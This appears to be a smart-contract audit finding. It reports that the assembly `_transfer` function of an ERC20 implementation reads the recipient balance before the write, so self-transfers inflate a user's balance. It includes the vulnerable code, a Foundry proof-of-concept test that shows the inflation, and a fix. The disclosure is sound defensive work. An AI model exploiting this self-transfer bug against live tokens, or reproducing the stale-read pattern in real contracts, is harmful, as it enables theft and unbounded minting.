# Self-Transfer Inflates User Balance Due to Stale Storage Read in `_transfer`

**File Scope:** `src/helpers/ERC20Internals.sol`

# Root + Impact

## Description

* **Normal Behavior**: When a user transfers tokens to themselves (`from == to`), the balance should remain unchanged since the same amount is subtracted and added.
* **Specific Issue**: In `_transfer`, the code loads `toAmount` from storage *before* writing the updated `fromAmount`. When `from == to`, both slots are identical. The `sstore(fromSlot, sub(fromAmount, value))` executes first, but `sstore(toSlot, add(toAmount, value))` uses the **old** `toAmount` (loaded before the first `sstore`), effectively adding `value` to the original balance.

```solidity
// Root cause in src/helpers/ERC20Internals.sol

    function _transfer(address from, address to, uint256 value) internal returns (bool success) {
        assembly ("memory-safe") {
            // ...
            let fromSlot := keccak256(ptr, 0x40)
            let fromAmount := sload(fromSlot)       // @> Load from's balance
            mstore(ptr, to)
            mstore(add(ptr, 0x20), baseSlot)
            let toSlot := keccak256(ptr, 0x40)
            let toAmount := sload(toSlot)           // @> Load to's balance (STALE when from==to)

            // ...
            sstore(fromSlot, sub(fromAmount, value)) // @> Write new from balance
            sstore(toSlot, add(toAmount, value))     // @> Write uses OLD toAmount!
        }
    }
```

## Risk

**Likelihood**:

* **High**: Self-transfers are common UX patterns (e.g., "refresh" balance in wallets, testing, or accidental same-address input).
* **High**: Any user can exploit this without special permissions.

**Impact**:

* **Critical**: Users can mint infinite tokens by repeatedly self-transferring. Each self-transfer of `X` increases balance by `X`.
* **Economic Collapse**: Token supply invariant is broken; attackers can drain liquidity pools or manipulate governance.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/ERC20.sol";

contract Token is ERC20 {
    constructor() ERC20("Token", "TKN") {}
    function mint(address to, uint256 amount) public { _mint(to, amount); }
}

contract SelfTransferOverflowTest is Test {
    Token token;
    address user = address(0x123);

    function setUp() public {
        token = new Token();
    }

    function testSelfTransferCorruptsBalance() public {
        token.mint(user, 100);
        assertEq(token.balanceOf(user), 100);

        vm.prank(user);
        token.transfer(user, 50);

        // Expected: 100 (no change)
        // Actual: 150 (balance increased by 50!)
        assertEq(token.balanceOf(user), 150);
    }
}
```

## Recommended Mitigation

Add early return for self-transfers or reload `toAmount` after `fromSlot` write:

```diff
    function _transfer(address from, address to, uint256 value) internal returns (bool success) {
        assembly ("memory-safe") {
+           // Early return for self-transfer
+           if eq(from, to) {
+               // Just emit event, no balance change needed
+               let ptr := mload(0x40)
+               mstore(ptr, value)
+               log3(ptr, 0x20, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, from, to)
+               success := 1
+               leave
+           }
            // ... rest of transfer logic
        }
    }
```
